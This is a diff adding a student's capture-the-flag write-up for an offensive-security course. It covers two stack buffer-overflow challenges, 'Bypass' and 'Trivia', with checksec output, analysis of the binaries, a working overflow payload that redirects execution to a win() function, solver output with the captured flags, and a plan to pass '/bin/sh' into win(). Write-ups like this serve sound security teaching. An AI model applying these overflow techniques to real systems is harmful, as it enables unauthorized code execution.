@@ -148,6 +148,128 @@ flag.txt
 $ cat flag.txt
 flag{Sm4sh1ng_Th3_St4ck_m0stly_f0r_fUn!_05a713a8067d49c6}
 ```
+## Challenge - Bypass
+```
+I've added a new protection for my stack! I'm pretty sure you can't find it!
+
+nc offsec-chalbroker.osiris.cyber.nyu.edu 1281
+```
+Lets start looking at bypass:
+```aiignore
+$ file bypass
+bypass: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b623ed4ab30e3e589e674d35eb7a53047f59f649, for GNU/Linux 3.2.0, not stripped
+```
+```aiignore
+$ pwn checksec --file=bypass
+[*] Checking for new versions of pwntools
+    To disable this functionality, set the contents of /home/nmaiorana/.cache/.pwntools-cache-3.12/update to 'never' (old way).
+    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
+        [update]
+        interval=never
+[*] You have the latest version of Pwntools (4.14.0)
+[*] '/mnt/csgy9223_IntroOffSec/week_5/bypass'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+Okay. No canary, PIE and not stripped. I wonder what extra security they added? Running process:
+```aiignore
+$ ./bypass
+
+        What is your favorite season?
+
+        btw, somebody left this number for you: 0xb0719fbe4fb6371d
+
+        >
+```
+I wonder what address that is for? Binja time.
+That's not an address. It's a random number. Creating a solver to send the value and see what happens. 
+
+Also, there is a function called win, but it never gets called. Looks like that number is a decoy. It does not even check it against anything. It essentially compares it to itself and returns. 
+
+I'm going to try to exploit the input by overriding the rip with the address of win(). It looks like I have to send the number in, so that it's comparison returns. If I can properly set the rip, this will work.
+
+The text of the number printed is in hex. Looking into printf() to see what the default representation is if there are nor formatting directives.
+
+Looks like we have to overwrite 2 things. First the number (long) and then the return address.
+
+```aiignore
+p.sendline((b'B' * 0x18) + p64(number) + (b'B' * 0x8) + p64(target_addr))
+```
+- 24 bytes to get to the location of number
+- packed 64 bit value of number
+- 8 bytes to get to the location of the rip
+- Address of the win() function
+This works, but crashes the process due to skipping the call instruction to win(). I tried using pwn to assemble the preamble:
+```aiignore
+00401383  f30f1efa           endbr64 
+00401387  55                 push    rbp {__saved_rbp}
+```
+By computing the size of those two instructions:
+```aiignore
+a = asm("endbr64; push rbp")
+```
+Unfortunately, this crashes my solver script. So to get past this for now, I subtracted the relative address from the next instruction from the beginning of the win function to determine where I want to jump into the win() function:
+
+```aiignore
+>>> 0x00401388 - 0x00401383
+5
+```
+Once I added thse 5 bytes to the address of win(), I got my flag.
+```aiignore
+$ python bypass_solver.py
+[+] Opening connection to offsec-chalbroker.osiris.cyber.nyu.edu on port 1281: Done
+Target address: 0x401383
+Number: 17355010529405525756
+[*] Switching to interactive mode
+
+You made it!
+
+$ ls
+bypass
+flag.txt
+$ cat flag.txt
+flag{n0_n33d_t0_gu3ss_wh3n_y0u_c4n_L34K_0f_th3_CaNarY_v4lu3!_966cfb138098902a}
+```
+## Challenge - Trivia
+```aiignore
+It's Trivia Time!!
+
+nc offsec-chalbroker.osiris.cyber.nyu.edu 1284
+```
+I download the binary and start looking around:
+```aiignore
+$ pwn checksec --file=trivia
+[*] '/mnt/csgy9223_IntroOffSec/week_5/trivia'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+No pie, No carary. Running the binary:
+```aiignore
+$ ./trivia
 
 
+        It's Trivia Time!
 
+        What is your favorite color?
+        >
+```
+Open binja:
+
+The main() function calls read(), so no gets() being called. But the number of bytes to be read in are 0x12, 18 bytes. So this can still be exploited since the address of buf is 18 bytes in. But there is a twist, if the win() function is called, it runs the value in &data. This is read in as the result of the 2nd question, so what if I put in "/bin/sh"? I'll set up a solver to try it out.
+
+Looking at win(), we want to be 5 bytes in. 
+
+I also have to xor the value to: "0xdec5cdc0b0c4dcc0". This is given to us in the init function: -0x2152411021524111. This is stored in an unsigned 64 bit int and ends up being:
+'0xdeadbeefdeadbeef'.
